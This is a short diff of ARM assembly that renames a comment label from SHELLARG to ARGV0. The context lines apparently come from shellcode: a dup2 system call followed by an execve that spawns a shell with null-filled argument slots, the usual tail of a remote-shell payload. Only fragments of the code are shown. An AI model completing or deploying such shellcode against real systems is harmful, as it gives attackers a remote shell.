@@ -63,7 +63,7 @@ _start:
        mov     r7, #63
        svc     0
 
-@ execve(SHELL, [SHELLARG], [NULL])
+@ execve(SHELL, [ARGV0], [NULL])
        add     r0, pc, #36
        eor     r4, r4, r4
        push    {r4}
@@ -86,7 +86,7 @@ _start:
 .word 0x00000000
 .word 0x00000000
 .word 0x00000000
-@ SHELLARG
+@ ARGV0
 .word 0x00000000 @ the args!
 .word 0x00000000
 .word 0x00000000
